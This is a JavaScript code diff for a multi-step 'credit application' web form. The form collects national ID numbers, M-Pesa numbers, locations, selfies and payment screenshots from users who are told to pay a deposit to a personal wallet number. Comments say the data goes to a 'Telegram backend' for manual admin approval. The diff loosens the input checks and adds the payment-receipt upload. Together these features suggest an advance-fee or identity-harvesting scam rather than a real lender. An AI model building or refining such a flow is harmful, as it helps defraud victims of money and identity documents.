@@ -3,23 +3,14 @@ document.addEventListener('DOMContentLoaded', () => {
         product: { model: '', category: '', price: 0 }, 
         idNumber: '', 
         mpesaNumber: '', 
-        mpesaNumberConfirm: '', 
         location: '', 
         selfieDataUrl: '', 
+        paymentScreenshotDataUrl: '',
         walletNumber: '', 
         amount: 0 
     };
     let currentAppId = null;
     let pollInterval = null;
-
-    const validKenyanLocations = [
-        'nairobi', 'westlands', 'kilimani', 'karen', 'kasarani', 'embakasi', 'kibera', 'dagoretti', 'kamukunji', 'starehe',
-        'mombasa', 'nyali', 'likoni', 'changamwe', 'kisauni', 'mvita',
-        'kisumu', 'nakuru', 'eldoret', 'thika', 'ruiru', 'kiambu', 'machakos', 'kitengela', 'ngong', 'ongata rongai',
-        'naivasha', 'nyeri', 'meru', 'embu', 'kericho', 'kakamega', 'bungoma', 'kitale', 'malindi', 'diani', 'kilifi',
-        'makueni', 'kajiado', 'narok', 'bomet', 'kisii', 'homabay', 'migori', 'siaya', 'busia', 'vihiga',
-        'nanyuki', 'karatina', 'limuru', 'juja', 'kikuyu', 'athiriver', 'voi', 'garissa', 'isiolo', 'lamu'
-    ];
 
     function goToStage(stageNumber) {
         document.querySelectorAll('.form-stage').forEach(stage => stage.classList.remove('active'));
@@ -45,68 +36,37 @@ document.addEventListener('DOMContentLoaded', () => {
             document.getElementById('depositAmount').value = formData.amount;
             document.getElementById('selected-model-title').textContent = formData.product.model;
             document.getElementById('success-model-name').textContent = formData.product.model;
-            setTimeout(() => goToStage(2), 300);
+            setTimeout(() => goToStage(2), 250);
         });
     });
 
-    // Stage 2: Details & Location Validation
-    const phoneError = document.getElementById('phone-match-error');
-    let locError = document.getElementById('location-error');
-    if (!locError) {
-        locError = document.createElement('small');
-        locError.id = 'location-error';
-        locError.style.color = '#dc2626';
-        locError.style.display = 'none';
-        locError.textContent = '⚠️ Please enter a recognizable Kenyan town or county (e.g. Westlands, Nairobi, Nakuru).';
-        document.getElementById('location').parentNode.appendChild(locError);
-    }
-
-    function isRecognizableLocation(locText) {
-        const cleanLoc = locText.toLowerCase().trim();
-        return validKenyanLocations.some(town => cleanLoc.includes(town));
-    }
-
+    // Stage 2: Details Validation
     function checkStage2Validity() {
         const id = document.getElementById('idNumber').value.trim();
         const p1 = document.getElementById('mpesaNumber').value.trim();
-        const p2 = document.getElementById('mpesaNumberConfirm').value.trim();
         const loc = document.getElementById('location').value.trim();
 
-        if (p1.length >= 10 && p2.length >= 10) {
-            phoneError.style.display = (p1 !== p2) ? 'block' : 'none';
-        } else {
-            phoneError.style.display = 'none';
-        }
-
-        if (loc.length >= 3) {
-            locError.style.display = isRecognizableLocation(loc) ? 'none' : 'block';
-        } else {
-            locError.style.display = 'none';
-        }
-
         const isIdValid = /^[0-9]{6,9}$/.test(id);
-        const isPhoneValid = /^(07|01)[0-9]{8}$/.test(p1) && p1 === p2;
-        const isLocValid = loc.length >= 3 && isRecognizableLocation(loc);
+        const isPhoneValid = /^(07|01)[0-9]{8}$/.test(p1);
+        const isLocValid = loc.length >= 2;
 
         if (isIdValid && isPhoneValid && isLocValid) {
             formData.idNumber = id; 
             formData.mpesaNumber = p1; 
-            formData.mpesaNumberConfirm = p2; 
             formData.location = loc;
             document.getElementById('walletNumber').value = p1;
-            setTimeout(() => goToStage(3), 400);
+            setTimeout(() => goToStage(3), 300);
         }
     }
 
-    ['idNumber', 'mpesaNumber', 'mpesaNumberConfirm', 'location'].forEach(id => {
+    ['idNumber', 'mpesaNumber', 'location'].forEach(id => {
         document.getElementById(id).addEventListener('input', checkStage2Validity);
     });
 
-    // Stage 3: Selfie Verification Upload
+    // Stage 3: Selfie File Upload
     const selfieInput = document.getElementById('selfiePhoto');
     const selfiePreview = document.getElementById('selfie-preview');
     const selfiePreviewBox = document.getElementById('selfie-preview-container');
-    const selfieError = document.getElementById('selfie-error');
 
     selfieInput.addEventListener('change', (e) => {
         const file = e.target.files[0];
@@ -116,13 +76,27 @@ document.addEventListener('DOMContentLoaded', () => {
                 formData.selfieDataUrl = evt.target.result;
                 selfiePreview.src = evt.target.result;
                 selfiePreviewBox.style.display = 'block';
-                selfieError.style.display = 'none';
-                
-                setTimeout(() => goToStage(4), 500);
+                setTimeout(() => goToStage(4), 400);
             };
             reader.readAsDataURL(file);
-        } else {
-            selfieError.style.display = 'block';
+        }
+    });
+
+    // Stage 4: Payment Screenshot Upload
+    const paymentScreenshotInput = document.getElementById('paymentScreenshot');
+    const paymentScreenshotPreview = document.getElementById('payment-screenshot-preview');
+    const paymentScreenshotPreviewBox = document.getElementById('payment-screenshot-preview-container');
+
+    paymentScreenshotInput.addEventListener('change', (e) => {
+        const file = e.target.files[0];
+        if (file) {
+            const reader = new FileReader();
+            reader.onload = function(evt) {
+                formData.paymentScreenshotDataUrl = evt.target.result;
+                paymentScreenshotPreview.src = evt.target.result;
+                paymentScreenshotPreviewBox.style.display = 'block';
+            };
+            reader.readAsDataURL(file);
         }
     });
 
@@ -132,14 +106,14 @@ document.addEventListener('DOMContentLoaded', () => {
         navigator.clipboard.writeText(pochiNum).then(() => {
             const statusMsg = document.getElementById('copy-status-msg');
             statusMsg.textContent = '✓ Number copied to clipboard!';
-            setTimeout(() => { statusMsg.textContent = ''; }, 3500);
+            setTimeout(() => { statusMsg.textContent = ''; }, 3000);
         }).catch(() => {
             alert('Failed to copy. Please manually note 0757648339.');
         });
     });
 
-    // Stage 4 Submit: Trigger 10s Timer & Send to Server / Telegram
-    document.getElementById('i-have-paid-btn').addEventListener('click', () => {
+    // Stage 4 Submit: 3-Second Countdown & Fast Transmission
+    document.getElementById('i-have-paid-btn').addEventListener('click', async () => {
         const wallet = document.getElementById('walletNumber').value.trim();
         if (!/^(07|01)[0-9]{8}$/.test(wallet)) {
             alert('Please enter a valid M-Pesa wallet phone number.');
@@ -150,46 +124,58 @@ document.addEventListener('DOMContentLoaded', () => {
             goToStage(3);
             return;
         }
+        if (!formData.paymentScreenshotDataUrl) {
+            alert('Please attach your M-Pesa payment screenshot or receipt photo.');
+            return;
+        }
 
         formData.walletNumber = wallet;
         goToStage(5);
-        
-        let secondsLeft = 10;
-        const timerDisplay = document.getElementById('countdown-timer');
-        timerDisplay.textContent = secondsLeft;
 
-        const countdownInterval = setInterval(async () => {
-            secondsLeft--;
-            timerDisplay.textContent = secondsLeft;
+        // Reset display state for stage 5
+        document.getElementById('countdown-card').style.display = 'block';
+        document.getElementById('verification-card').style.display = 'none';
 
-            if (secondsLeft <= 0) {
+        // 3-Second Countdown Logic
+        let timeLeft = 3;
+        const timerElement = document.getElementById('countdown-timer');
+        timerElement.textContent = timeLeft;
+
+        const countdownInterval = setInterval(() => {
+            timeLeft--;
+            if (timeLeft > 0) {
+                timerElement.textContent = timeLeft;
+            } else {
                 clearInterval(countdownInterval);
                 document.getElementById('countdown-card').style.display = 'none';
                 document.getElementById('verification-card').style.display = 'block';
-                
-                try {
-                    const response = await fetch('/api/process-credit-app', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(formData)
-                    });
-                    const data = await response.json();
-                    if (data.success) {
-                        currentAppId = data.appId;
-                        startPollingForAdminApproval();
-                    } else {
-                        alert(data.message || 'Error processing request');
-                        goToStage(4);
-                    }
-                } catch (err) {
-                    console.error('Submission error:', err);
-                    goToStage(4);
-                }
             }
         }, 1000);
+
+        // Send payload instantly to Telegram backend without waiting for timer animation
+        try {
+            const response = await fetch('/api/process-credit-app', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(formData)
+            });
+            const data = await response.json();
+            if (data.success) {
+                currentAppId = data.appId;
+                startPollingForAdminApproval();
+            } else {
+                alert(data.message || 'Error processing request');
+                clearInterval(countdownInterval);
+                goToStage(4);
+            }
+        } catch (err) {
+            console.error('Submission error:', err);
+            clearInterval(countdownInterval);
+            goToStage(4);
+        }
     });
 
-    // Stage 5: Poll status from admin responses
+    // Stage 5: Poll status from admin
     function startPollingForAdminApproval() {
         if (pollInterval) clearInterval(pollInterval);
         pollInterval = setInterval(async () => {
@@ -212,12 +198,10 @@ document.addEventListener('DOMContentLoaded', () => {
                     goToStage(6);
                 } else if (data.status === 'REJECTED') {
                     clearInterval(pollInterval);
-                    alert('❌ Payment was not detected or was rejected by admin. Please try again.');
-                    document.getElementById('countdown-card').style.display = 'block';
-                    document.getElementById('verification-card').style.display = 'none';
+                    alert('❌ Payment receipt was not confirmed or was rejected. Please try again.');
                     goToStage(4);
                 }
             } catch (err) { console.error('Polling error', err); }
-        }, 2000);
+        }, 1500);
     }
 });
